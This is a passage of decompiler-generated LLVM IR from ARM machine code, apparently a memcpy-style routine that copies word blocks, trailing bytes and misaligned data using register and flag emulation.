  %v3_1807c = sub i32 31, %v0_1807c
  %v4_1807c = and i32 %v3_1807c, %v0_1807c
  %v5_1807c = icmp slt i32 %v4_1807c, 0
  %v6_1807c = icmp slt i32 %v1_1807c, 0
  %v2_18080 = xor i1 %v6_1807c, %v5_1807c
  br i1 %v2_18080, label %dec_label_pc_18084, label %dec_label_pc_1806c.dec_label_pc_1806c_crit_edge

dec_label_pc_1806c.dec_label_pc_1806c_crit_edge:  ; preds = %dec_label_pc_1806c
  %v0_1806c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1806c

dec_label_pc_18084:                               ; preds = %dec_label_pc_1806c
  %v1_18084 = add i32 %v0_1807c, -16
  %v3_18084 = add i32 %v0_1807c, 2147483616
  %v4_18084 = and i32 %v1_18084, %v3_18084
  %v5_18084 = icmp slt i32 %v4_18084, 0
  store i1 %v5_18084, i1* %cpsr_v.global-to-local, align 1
  %v6_18084 = icmp slt i32 %v1_18084, 0
  store i1 %v6_18084, i1* %cpsr_n.global-to-local, align 1
  %v7_18084 = icmp eq i32 %v1_18084, 0
  store i1 %v7_18084, i1* %cpsr_z.global-to-local, align 1
  %v2_18088 = xor i1 %v6_18084, %v5_18084
  br i1 %v2_18088, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_18084
  %v3_18088 = load i32, i32* @r1, align 4
  %v4_18088 = inttoptr i32 %v3_18088 to i32*
  %v5_18088 = load i32, i32* %v4_18088, align 4
  store i32 %v5_18088, i32* @r3, align 4
  %v6_18088 = add i32 %v3_18088, 4
  %v7_18088 = inttoptr i32 %v6_18088 to i32*
  %v8_18088 = load i32, i32* %v7_18088, align 4
  store i32 %v8_18088, i32* %r4.global-to-local, align 4
  %v9_18088 = add i32 %v3_18088, 8
  %v10_18088 = inttoptr i32 %v9_18088 to i32*
  %v11_18088 = load i32, i32* %v10_18088, align 4
  store i32 %v11_18088, i32* @ip, align 4
  %v12_18088 = add i32 %v3_18088, 12
  %v13_18088 = inttoptr i32 %v12_18088 to i32*
  %v14_18088 = load i32, i32* %v13_18088, align 4
  store i32 %v14_18088, i32* %lr.global-to-local, align 4
  %v15_18088 = add i32 %v3_18088, 16
  store i32 %v15_18088, i32* @r1, align 4
  %v4_1808c = inttoptr i32 %v12_18078 to i32*
  store i32 %v5_18088, i32* %v4_1808c, align 4
  %v6_1808c = add i32 %v0_18070, 36
  %v7_1808c = inttoptr i32 %v6_1808c to i32*
  %v8_1808c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1808c, i32* %v7_1808c, align 4
  %v9_1808c = add i32 %v0_18070, 40
  %v10_1808c = inttoptr i32 %v9_1808c to i32*
  %v11_1808c = load i32, i32* @ip, align 4
  store i32 %v11_1808c, i32* %v10_1808c, align 4
  %v12_1808c = add i32 %v0_18070, 44
  %v13_1808c = inttoptr i32 %v12_1808c to i32*
  %v14_1808c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1808c, i32* %v13_1808c, align 4
  %v15_1808c = add i32 %v0_18070, 48
  store i32 %v15_1808c, i32* @r0, align 4
  %v3_18090 = load i32, i32* %r2.global-to-local, align 4
  %v4_18090 = add i32 %v3_18090, -16
  store i32 %v4_18090, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_18084, %bb136
  %v3_180a0102111 = phi i32 [ %v15_1808c, %bb136 ], [ %v12_18078, %dec_label_pc_18084 ]
  %v0_18098.pre = phi i32 [ %v4_18090, %bb136 ], [ %v1_1807c, %dec_label_pc_18084 ]
  %v2_18094 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18094, i32* @r4, align 4
  br label %dec_label_pc_18098

dec_label_pc_18098:                               ; preds = %dec_label_pc_18060, %bb137
  %v3_180a0101 = phi i32 [ %v0_1807094, %dec_label_pc_18060 ], [ %v3_180a0102111, %bb137 ]
  %v0_18098 = phi i32 [ %v1_18060, %dec_label_pc_18060 ], [ %v0_18098.pre, %bb137 ]
  %v1_18098 = add i32 %v0_18098, 20
  store i32 %v1_18098, i32* %r2.global-to-local, align 4
  %v3_18098 = sub i32 0, %v0_18098
  %v4_18098 = and i32 %v1_18098, %v3_18098
  %v5_18098 = icmp slt i32 %v4_18098, 0
  store i1 %v5_18098, i1* %cpsr_v.global-to-local, align 1
  %v6_18098 = icmp slt i32 %v1_18098, 0
  store i1 %v6_18098, i1* %cpsr_n.global-to-local, align 1
  %v7_18098 = icmp eq i32 %v1_18098, 0
  store i1 %v7_18098, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1809c

dec_label_pc_1809c:                               ; preds = %.thread115, %dec_label_pc_18098
  %v0_180ac.pre157 = phi i32 [ %v0_180ac.pre, %.thread115 ], [ %v1_18098, %dec_label_pc_18098 ]
  %v3_180a0 = phi i32 [ %v3_180a099116, %.thread115 ], [ %v3_180a0101, %dec_label_pc_18098 ]
  %v1_180a4 = phi i1 [ %v1_180a8, %.thread115 ], [ %v5_18098, %dec_label_pc_18098 ]
  %v0_180a4 = phi i1 [ %v0_180a8, %.thread115 ], [ %v6_18098, %dec_label_pc_18098 ]
  %v2_1809c = xor i1 %v1_180a4, %v0_180a4
  br i1 %v2_1809c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_1809c
  %v3_1809c = load i32, i32* @r1, align 4
  %v4_1809c = inttoptr i32 %v3_1809c to i32*
  %v5_1809c = load i32, i32* %v4_1809c, align 4
  store i32 %v5_1809c, i32* @r3, align 4
  %v6_1809c = add i32 %v3_1809c, 4
  %v7_1809c = inttoptr i32 %v6_1809c to i32*
  %v8_1809c = load i32, i32* %v7_1809c, align 4
  store i32 %v8_1809c, i32* @ip, align 4
  %v9_1809c = add i32 %v3_1809c, 8
  %v10_1809c = inttoptr i32 %v9_1809c to i32*
  %v11_1809c = load i32, i32* %v10_1809c, align 4
  store i32 %v11_1809c, i32* %lr.global-to-local, align 4
  %v12_1809c = add i32 %v3_1809c, 12
  store i32 %v12_1809c, i32* @r1, align 4
  %v4_180a0 = inttoptr i32 %v3_180a0 to i32*
  store i32 %v5_1809c, i32* %v4_180a0, align 4
  %v6_180a0 = add i32 %v3_180a0, 4
  %v7_180a0 = inttoptr i32 %v6_180a0 to i32*
  %v8_180a0 = load i32, i32* @ip, align 4
  store i32 %v8_180a0, i32* %v7_180a0, align 4
  %v9_180a0 = add i32 %v3_180a0, 8
  %v10_180a0 = inttoptr i32 %v9_180a0 to i32*
  %v11_180a0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_180a0, i32* %v10_180a0, align 4
  %v12_180a0 = add i32 %v3_180a0, 12
  store i32 %v12_180a0, i32* @r0, align 4
  %v3_180a4 = load i32, i32* %r2.global-to-local, align 4
  %v4_180a4 = add i32 %v3_180a4, -12
  store i32 %v4_180a4, i32* %r2.global-to-local, align 4
  %v6_180a4 = sub i32 11, %v3_180a4
  %v7_180a4 = and i32 %v6_180a4, %v3_180a4
  %v8_180a4 = icmp slt i32 %v7_180a4, 0
  store i1 %v8_180a4, i1* %cpsr_v.global-to-local, align 1
  %v9_180a4 = icmp slt i32 %v4_180a4, 0
  store i1 %v9_180a4, i1* %cpsr_n.global-to-local, align 1
  %v10_180a4 = icmp eq i32 %v3_180a4, 12
  store i1 %v10_180a4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1809c, %bb138
  %v0_180ac.pre = phi i32 [ %v4_180a4, %bb138 ], [ %v0_180ac.pre157, %dec_label_pc_1809c ]
  %v3_180a099116 = phi i32 [ %v12_180a0, %bb138 ], [ %v3_180a0, %dec_label_pc_1809c ]
  %v1_180a8 = phi i1 [ %v8_180a4, %bb138 ], [ %v1_180a4, %dec_label_pc_1809c ]
  %v0_180a8 = phi i1 [ %v9_180a4, %bb138 ], [ %v0_180a4, %dec_label_pc_1809c ]
  %v2_180a8 = xor i1 %v1_180a8, %v0_180a8
  br i1 %v2_180a8, label %dec_label_pc_180ac, label %dec_label_pc_1809c

dec_label_pc_180ac:                               ; preds = %.thread115, %dec_label_pc_18058
  %v4_180bc = phi i32 [ %v0_1807094, %dec_label_pc_18058 ], [ %v3_180a099116, %.thread115 ]
  %v0_180ac = phi i32 [ %v1_18058, %dec_label_pc_18058 ], [ %v0_180ac.pre, %.thread115 ]
  %v1_180ac = add i32 %v0_180ac, 8
  store i32 %v1_180ac, i32* %r2.global-to-local, align 4
  %v3_180ac = sub i32 0, %v0_180ac
  %v4_180ac = and i32 %v1_180ac, %v3_180ac
  %v5_180ac = icmp slt i32 %v4_180ac, 0
  store i1 %v5_180ac, i1* %cpsr_v.global-to-local, align 1
  %v6_180ac = icmp slt i32 %v1_180ac, 0
  store i1 %v6_180ac, i1* %cpsr_n.global-to-local, align 1
  %v7_180ac = icmp eq i32 %v1_180ac, 0
  store i1 %v7_180ac, i1* %cpsr_z.global-to-local, align 1
  %v2_180b0 = xor i1 %v6_180ac, %v5_180ac
  br i1 %v2_180b0, label %bb140, label %dec_label_pc_180b4

dec_label_pc_180b4:                               ; preds = %dec_label_pc_180ac
  %v1_180b4 = add i32 %v0_180ac, 4
  store i32 %v1_180b4, i32* %r2.global-to-local, align 4
  %v3_180b4 = sub i32 -5, %v0_180ac
  %v4_180b4 = and i32 %v3_180b4, %v1_180ac
  %v5_180b4 = icmp slt i32 %v4_180b4, 0
  store i1 %v5_180b4, i1* %cpsr_v.global-to-local, align 1
  %v6_180b4 = icmp slt i32 %v1_180b4, 0
  store i1 %v6_180b4, i1* %cpsr_n.global-to-local, align 1
  %v7_180b4 = icmp eq i32 %v1_180ac, 4
  store i1 %v7_180b4, i1* %cpsr_z.global-to-local, align 1
  %v2_180b8 = xor i1 %v6_180b4, %v5_180b4
  %v3_180b8 = load i32, i32* @r1, align 4
  %v4_180b8 = inttoptr i32 %v3_180b8 to i32*
  %v5_180b8 = load i32, i32* %v4_180b8, align 4
  store i32 %v5_180b8, i32* @r3, align 4
  %v7_180b8 = add i32 %v3_180b8, 4
  br i1 %v2_180b8, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_180b4
  store i32 %v7_180b8, i32* @r1, align 4
  %v5_180bc = inttoptr i32 %v4_180bc to i32*
  store i32 %v5_180b8, i32* %v5_180bc, align 4
  %v6_180bc = load i32, i32* @r0, align 4
  %v7_180bc = add i32 %v6_180bc, 4
  store i32 %v7_180bc, i32* @r0, align 4
  %v0_180cc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_180b4
  %v7_180c0 = inttoptr i32 %v7_180b8 to i32*
  %v8_180c0 = load i32, i32* %v7_180c0, align 4
  store i32 %v8_180c0, i32* @ip, align 4
  %v9_180c0 = add i32 %v3_180b8, 8
  store i32 %v9_180c0, i32* @r1, align 4
  %v4_180c4 = inttoptr i32 %v4_180bc to i32*
  store i32 %v5_180b8, i32* %v4_180c4, align 4
  %v6_180c4 = add i32 %v4_180bc, 4
  %v7_180c4 = inttoptr i32 %v6_180c4 to i32*
  %v8_180c4 = load i32, i32* @ip, align 4
  store i32 %v8_180c4, i32* %v7_180c4, align 4
  %v9_180c4 = add i32 %v4_180bc, 8
  store i32 %v9_180c4, i32* @r0, align 4
  %v3_180c8 = load i32, i32* %r2.global-to-local, align 4
  %v4_180c8 = add i32 %v3_180c8, -4
  store i32 %v4_180c8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_180ac, %bb, %dec_label_pc_1827c, %dec_label_pc_18210, %dec_label_pc_181a4, %bb139
  %v0_180cc = phi i32 [ %v0_180cc.pre, %.thread122 ], [ %v2_1811c, %.thread128 ], [ %v1_180ac, %dec_label_pc_180ac ], [ %v2_18040, %bb ], [ %v0_180cc61, %dec_label_pc_1827c ], [ %v0_180cc60, %dec_label_pc_18210 ], [ %v0_180cc59, %dec_label_pc_181a4 ], [ %v4_180c8, %bb139 ]
  %v1_180cc = add i32 %v0_180cc, 4
  store i32 %v1_180cc, i32* %r2.global-to-local, align 4
  %v3_180cc = sub i32 0, %v0_180cc
  %v4_180cc = and i32 %v1_180cc, %v3_180cc
  %v5_180cc = icmp slt i32 %v4_180cc, 0
  store i1 %v5_180cc, i1* %cpsr_v.global-to-local, align 1
  %v6_180cc = icmp slt i32 %v1_180cc, 0
  store i1 %v6_180cc, i1* %cpsr_n.global-to-local, align 1
  %v7_180cc = icmp eq i32 %v1_180cc, 0
  store i1 %v7_180cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_180cc, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_180d4.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_180d0 = load i8*, i8** %stack_var_-8, align 4
  %v4_180d0 = ptrtoint i8* %v3_180d0 to i32
  store i32 %v4_180d0, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_180d4 = phi i32 [ %v0_180d4.pre, %bb140.bb142_crit_edge ], [ %v8_1803c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_180cc, i32 %v0_180d4)
  %v0_180d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_180d8 = add i32 %v0_180d8, -2
  %v3_180d8 = sub i32 1, %v0_180d8
  %v4_180d8 = and i32 %v3_180d8, %v0_180d8
  %v5_180d8 = icmp slt i32 %v4_180d8, 0
  store i1 %v5_180d8, i1* %cpsr_v.global-to-local, align 1
  %v6_180d8 = icmp slt i32 %v1_180d8, 0
  store i1 %v6_180d8, i1* %cpsr_n.global-to-local, align 1
  %v7_180d8 = icmp eq i32 %v0_180d8, 2
  store i1 %v7_180d8, i1* %cpsr_z.global-to-local, align 1
  %v0_180dc = load i32, i32* @r1, align 4
  %v1_180dc = inttoptr i32 %v0_180dc to i8*
  %v2_180dc = load i8, i8* %v1_180dc, align 1
  %v5_180dc = add i32 %v0_180dc, 1
  store i32 %v5_180dc, i32* %r1.global-to-local, align 4
  %v2_180e0 = load i32, i32* @r0, align 4
  %v3_180e0 = inttoptr i32 %v2_180e0 to i8*
  store i8 %v2_180dc, i8* %v3_180e0, align 1
  %v4_180e0 = load i32, i32* @r0, align 4
  %v5_180e0 = add i32 %v4_180e0, 1
  store i32 %v5_180e0, i32* %r0.global-to-local, align 4
  %v0_180e4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_180e4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_180e4 = xor i1 %v0_180e4, %v1_180e4
  br i1 %v2_180e4, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_180e4 = load i32, i32* %r1.global-to-local, align 4
  %v4_180e4 = inttoptr i32 %v3_180e4 to i8*
  %v5_180e4 = load i8, i8* %v4_180e4, align 1
  %v8_180e4 = add i32 %v3_180e4, 1
  store i32 %v8_180e4, i32* %r1.global-to-local, align 4
  %v6_180e8 = inttoptr i32 %v5_180e0 to i8*
  store i8 %v5_180e4, i8* %v6_180e8, align 1
  %v7_180e8 = load i32, i32* %r0.global-to-local, align 4
  %v8_180e8 = add i32 %v7_180e8, 1
  store i32 %v8_180e8, i32* %r0.global-to-local, align 4
  %v1_180ec.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_180ec.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_180f0 = phi i32 [ %v8_180e8, %bb143 ], [ %v5_180e0, %bb142 ]
  %v2_180f0 = phi i1 [ %v2_180ec.pre, %bb143 ], [ %v1_180e4, %bb142 ]
  %v1_180f0 = phi i1 [ %v1_180ec.pre, %bb143 ], [ %v0_180e4, %bb142 ]
  %v0_180ec = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_180ec = xor i1 %v2_180f0, %v1_180f0
  %v4_180ec = or i1 %v0_180ec, %v3_180ec
  br i1 %v4_180ec, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_180ec = load i32, i32* %r1.global-to-local, align 4
  %v6_180ec = inttoptr i32 %v5_180ec to i8*
  %v7_180ec = load i8, i8* %v6_180ec, align 1
  %v10_180ec = add i32 %v5_180ec, 1
  store i32 %v10_180ec, i32* %r1.global-to-local, align 4
  %v8_180f0 = inttoptr i32 %v7_180f0 to i8*
  store i8 %v7_180ec, i8* %v8_180f0, align 1
  %v9_180f0 = load i32, i32* %r0.global-to-local, align 4
  %v10_180f0 = add i32 %v9_180f0, 1
  store i32 %v10_180f0, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_180f4 = load i8*, i8** %stack_var_-8, align 4
  %v3_180f4 = ptrtoint i8* %v2_180f4 to i32
  store i32 %v3_180f4, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_1803c)
  %v0_180fc.pre = load i32, i32* @ip, align 4
  %v0_18104.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_18108.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_180fc

dec_label_pc_180fc:                               ; preds = %dec_label_pc_18048, %.thread126
  %v2_18108 = phi i32 [ %v1_18030, %dec_label_pc_18048 ], [ %v2_18108.pre, %.thread126 ]
  %v0_18104 = phi i32 [ %v0_18030, %dec_label_pc_18048 ], [ %v0_18104.pre, %.thread126 ]
  %v0_180fc = phi i32 [ %v1_18048, %dec_label_pc_18048 ], [ %v0_180fc.pre, %.thread126 ]
  %v1_180fc = sub i32 4, %v0_180fc
  store i32 %v1_180fc, i32* @ip, align 4
  %v1_18100 = add i32 %v1_180fc, -2
  %v3_18100 = sub i32 1, %v1_180fc
  %v4_18100 = and i32 %v3_18100, %v1_180fc
  %v5_18100 = icmp slt i32 %v4_18100, 0
  store i1 %v5_18100, i1* %cpsr_v.global-to-local, align 1
  %v6_18100 = icmp slt i32 %v1_18100, 0
  store i1 %v6_18100, i1* %cpsr_n.global-to-local, align 1
  %v7_18100 = icmp eq i32 %v1_180fc, 2
  store i1 %v7_18100, i1* %cpsr_z.global-to-local, align 1
  %v1_18104 = inttoptr i32 %v0_18104 to i8*
  %v2_18104 = load i8, i8* %v1_18104, align 1
  %v3_18104 = zext i8 %v2_18104 to i32
  store i32 %v3_18104, i32* @r3, align 4
  %v5_18104 = add i32 %v0_18104, 1
  store i32 %v5_18104, i32* @r1, align 4
  %v3_18108 = inttoptr i32 %v2_18108 to i8*
  store i8 %v2_18104, i8* %v3_18108, align 1
  %v4_18108 = load i32, i32* @r0, align 4
  %v5_18108 = add i32 %v4_18108, 1
  store i32 %v5_18108, i32* @r0, align 4
  %v0_1810c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1810c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1810c = xor i1 %v0_1810c, %v1_1810c
  br i1 %v2_1810c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_180fc
  %v3_1810c = load i32, i32* @r1, align 4
  %v4_1810c = inttoptr i32 %v3_1810c to i8*
  %v5_1810c = load i8, i8* %v4_1810c, align 1
  %v6_1810c = zext i8 %v5_1810c to i32
  store i32 %v6_1810c, i32* @r3, align 4
  %v8_1810c = add i32 %v3_1810c, 1
  store i32 %v8_1810c, i32* @r1, align 4
  %v6_18110 = inttoptr i32 %v5_18108 to i8*
  store i8 %v5_1810c, i8* %v6_18110, align 1
  %v7_18110 = load i32, i32* @r0, align 4
  %v8_18110 = add i32 %v7_18110, 1
  store i32 %v8_18110, i32* @r0, align 4
  %v1_18114.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18114.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_180fc, %bb145
  %v7_18118 = phi i32 [ %v8_18110, %bb145 ], [ %v5_18108, %dec_label_pc_180fc ]
  %v2_18118 = phi i1 [ %v2_18114.pre, %bb145 ], [ %v1_1810c, %dec_label_pc_180fc ]
  %v1_18118 = phi i1 [ %v1_18114.pre, %bb145 ], [ %v0_1810c, %dec_label_pc_180fc ]
  %v0_18114 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18114 = xor i1 %v2_18118, %v1_18118
  %v4_18114 = or i1 %v0_18114, %v3_18114
  br i1 %v4_18114, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_18114 = load i32, i32* @r1, align 4
  %v6_18114 = inttoptr i32 %v5_18114 to i8*
  %v7_18114 = load i8, i8* %v6_18114, align 1
  %v8_18114 = zext i8 %v7_18114 to i32
  store i32 %v8_18114, i32* @r3, align 4
  %v10_18114 = add i32 %v5_18114, 1
  store i32 %v10_18114, i32* @r1, align 4
  %v8_18118 = inttoptr i32 %v7_18118 to i8*
  store i8 %v7_18114, i8* %v8_18118, align 1
  %v9_18118 = load i32, i32* @r0, align 4
  %v10_18118 = add i32 %v9_18118, 1
  store i32 %v10_18118, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_1824c77 = phi i32 [ %v10_18118, %bb146 ], [ %v7_18118, %.thread127 ]
  %v0_1811c = load i32, i32* %r2.global-to-local, align 4
  %v1_1811c = load i32, i32* @ip, align 4
  %v2_1811c = sub i32 %v0_1811c, %v1_1811c
  store i32 %v2_1811c, i32* %r2.global-to-local, align 4
  %v4_1811c = xor i32 %v1_1811c, %v0_1811c
  %v5_1811c = xor i32 %v2_1811c, %v0_1811c
  %v6_1811c = and i32 %v5_1811c, %v4_1811c
  %v7_1811c = icmp slt i32 %v6_1811c, 0
  store i1 %v7_1811c, i1* %cpsr_v.global-to-local, align 1
  %v8_1811c = icmp slt i32 %v2_1811c, 0
  store i1 %v8_1811c, i1* %cpsr_n.global-to-local, align 1
  %v9_1811c = icmp eq i32 %v0_1811c, %v1_1811c
  store i1 %v9_1811c, i1* %cpsr_z.global-to-local, align 1
  %v2_18120 = xor i1 %v8_1811c, %v7_1811c
  br i1 %v2_18120, label %bb140, label %dec_label_pc_18124

dec_label_pc_18124:                               ; preds = %.thread128
  %v0_18124 = load i32, i32* @r1, align 4
  %v1_18124 = urem i32 %v0_18124, 4
  store i32 %v1_18124, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18124 = icmp eq i32 %v1_18124, 0
  store i1 %v2_18124, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_18124 to i2
  br i1 %v2_18124, label %dec_label_pc_18058, label %dec_label_pc_1812c

dec_label_pc_1812c:                               ; preds = %dec_label_pc_18050, %dec_label_pc_18124
  %v0_1824c76 = phi i32 [ %v1_18030, %dec_label_pc_18050 ], [ %v0_1824c77, %dec_label_pc_18124 ]
  %v0_181b4 = phi i32 [ %v2_18040, %dec_label_pc_18050 ], [ %v2_1811c, %dec_label_pc_18124 ]
  %v0_18134.off0 = phi i2 [ %extract.t, %dec_label_pc_18050 ], [ %extract.t131, %dec_label_pc_18124 ]
  %v0_1812c = phi i32 [ %v0_18030, %dec_label_pc_18050 ], [ %v0_18124, %dec_label_pc_18124 ]
  %v1_1812c = and i32 %v0_1812c, -4
  store i32 %v1_1812c, i32* %r1.global-to-local, align 4
  %v1_18130 = inttoptr i32 %v1_1812c to i32*
  %v2_18130 = load i32, i32* %v1_18130, align 4
  store i32 %v2_18130, i32* %lr.global-to-local, align 4
  %v4_18130 = add i32 %v1_1812c, 4
  store i32 %v4_18130, i32* %r1.global-to-local, align 4
  %v1_181ac = add i32 %v0_181b4, -12
  %v3_181ac = sub i32 11, %v0_181b4
  %v4_181ac = and i32 %v3_181ac, %v0_181b4
  %v5_181ac = icmp slt i32 %v4_181ac, 0
  store i1 %v5_181ac, i1* %cpsr_v.global-to-local, align 1
  %v6_181ac = icmp slt i32 %v1_181ac, 0
  store i1 %v6_181ac, i1* %cpsr_n.global-to-local, align 1
  %v7_181ac = icmp eq i32 %v0_181b4, 12
  store i1 %v7_181ac, i1* %cpsr_z.global-to-local, align 1
  %v2_181b0 = xor i1 %v6_181ac, %v5_181ac
  switch i2 %v0_18134.off0, label %dec_label_pc_18140 [
    i2 -1, label %dec_label_pc_18218
    i2 -2, label %dec_label_pc_181ac
  ]

dec_label_pc_18140:                               ; preds = %dec_label_pc_1812c
  br i1 %v2_181b0, label %dec_label_pc_1818c, label %dec_label_pc_18148

dec_label_pc_18148:                               ; preds = %dec_label_pc_18140
  store i32 %v1_181ac, i32* %r2.global-to-local, align 4
  %v3_1814c = load i32, i32* @r4, align 4
  store i32 %v3_1814c, i32* %stack_var_-16, align 4
  %v6_1814c = load i32, i32* @r5, align 4
  store i32 %v6_1814c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18150

dec_label_pc_18150:                               ; preds = %dec_label_pc_18150.dec_label_pc_18150_crit_edge, %dec_label_pc_18148
  %v0_18174 = phi i32 [ %v12_18174, %dec_label_pc_18150.dec_label_pc_18150_crit_edge ], [ %v0_1824c76, %dec_label_pc_18148 ]
  %v0_18154 = phi i32 [ %v0_18154.pre, %dec_label_pc_18150.dec_label_pc_18150_crit_edge ], [ %v4_18130, %dec_label_pc_18148 ]
  %v0_18150 = phi i32 [ %v0_18150.pre, %dec_label_pc_18150.dec_label_pc_18150_crit_edge ], [ %v2_18130, %dec_label_pc_18148 ]
  %v3_18150 = udiv i32 %v0_18150, 256
  %v1_18154 = inttoptr i32 %v0_18154 to i32*
  %v2_18154 = load i32, i32* %v1_18154, align 4
  store i32 %v2_18154, i32* %r4.global-to-local, align 4
  %v3_18154 = add i32 %v0_18154, 4
  %v4_18154 = inttoptr i32 %v3_18154 to i32*
  %v5_18154 = load i32, i32* %v4_18154, align 4
  store i32 %v5_18154, i32* %r5.global-to-local, align 4
  %v6_18154 = add i32 %v0_18154, 8
  %v7_18154 = inttoptr i32 %v6_18154 to i32*
  %v8_18154 = load i32, i32* %v7_18154, align 4
  store i32 %v8_18154, i32* %ip.global-to-local, align 4
  %v9_18154 = add i32 %v0_18154, 12
  %v10_18154 = inttoptr i32 %v9_18154 to i32*
  %v11_18154 = load i32, i32* %v10_18154, align 4
  store i32 %v11_18154, i32* %lr.global-to-local, align 4
  %v12_18154 = add i32 %v0_18154, 16
  store i32 %v12_18154, i32* %r1.global-to-local, align 4
  %v4_18158 = mul i32 %v2_18154, 16777216
  %v5_18158 = or i32 %v4_18158, %v3_18150
  store i32 %v5_18158, i32* @r3, align 4
  %v3_1815c = udiv i32 %v2_18154, 256
  %v4_18160 = mul i32 %v5_18154, 16777216
  %v5_18160 = or i32 %v4_18160, %v3_1815c
  store i32 %v5_18160, i32* %r4.global-to-local, align 4
  %v3_18164 = udiv i32 %v5_18154, 256
  %v4_18168 = mul i32 %v8_18154, 16777216
  %v5_18168 = or i32 %v4_18168, %v3_18164
  store i32 %v5_18168, i32* %r5.global-to-local, align 4
  %v3_1816c = udiv i32 %v8_18154, 256
  %v4_18170 = mul i32 %v11_18154, 16777216
  %v5_18170 = or i32 %v4_18170, %v3_1816c
  store i32 %v5_18170, i32* @ip, align 4
  %v1_18174 = inttoptr i32 %v0_18174 to i32*
  store i32 %v5_18158, i32* %v1_18174, align 4
  %v3_18174 = add i32 %v0_18174, 4
  %v4_18174 = inttoptr i32 %v3_18174 to i32*
  %v5_18174 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18174, i32* %v4_18174, align 4
  %v6_18174 = add i32 %v0_18174, 8
  %v7_18174 = inttoptr i32 %v6_18174 to i32*
  %v8_18174 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18174, i32* %v7_18174, align 4
  %v9_18174 = add i32 %v0_18174, 12
  %v10_18174 = inttoptr i32 %v9_18174 to i32*
  %v11_18174 = load i32, i32* @ip, align 4
  store i32 %v11_18174, i32* %v10_18174, align 4
  %v12_18174 = add i32 %v0_18174, 16
  store i32 %v12_18174, i32* @r0, align 4
  %v0_18178 = load i32, i32* %r2.global-to-local, align 4
  %v1_18178 = add i32 %v0_18178, -16
  store i32 %v1_18178, i32* %r2.global-to-local, align 4
  %v3_18178 = sub i32 15, %v0_18178
  %v4_18178 = and i32 %v3_18178, %v0_18178
  %v5_18178 = icmp slt i32 %v4_18178, 0
  %v6_18178 = icmp slt i32 %v1_18178, 0
  %v2_1817c = xor i1 %v6_18178, %v5_18178
  br i1 %v2_1817c, label %dec_label_pc_18180, label %dec_label_pc_18150.dec_label_pc_18150_crit_edge

dec_label_pc_18150.dec_label_pc_18150_crit_edge:  ; preds = %dec_label_pc_18150
  %v0_18150.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18154.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18150

dec_label_pc_18180:                               ; preds = %dec_label_pc_18150
  %v2_18180 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18180, i32* @r4, align 4
  %v5_18180 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18180, i32* @r5, align 4
  %v1_18184 = add i32 %v0_18178, -4
  store i32 %v1_18184, i32* %r2.global-to-local, align 4
  %v3_18184 = add i32 %v0_18178, 2147483632
  %v4_18184 = and i32 %v1_18184, %v3_18184
  %v5_18184 = icmp slt i32 %v4_18184, 0
  store i1 %v5_18184, i1* %cpsr_v.global-to-local, align 1
  %v6_18184 = icmp slt i32 %v1_18184, 0
  store i1 %v6_18184, i1* %cpsr_n.global-to-local, align 1
  %v7_18184 = icmp eq i32 %v1_18184, 0
  store i1 %v7_18184, i1* %cpsr_z.global-to-local, align 1
  %v2_18188 = xor i1 %v6_18184, %v5_18184
  br i1 %v2_18188, label %dec_label_pc_181a4, label %dec_label_pc_1818c

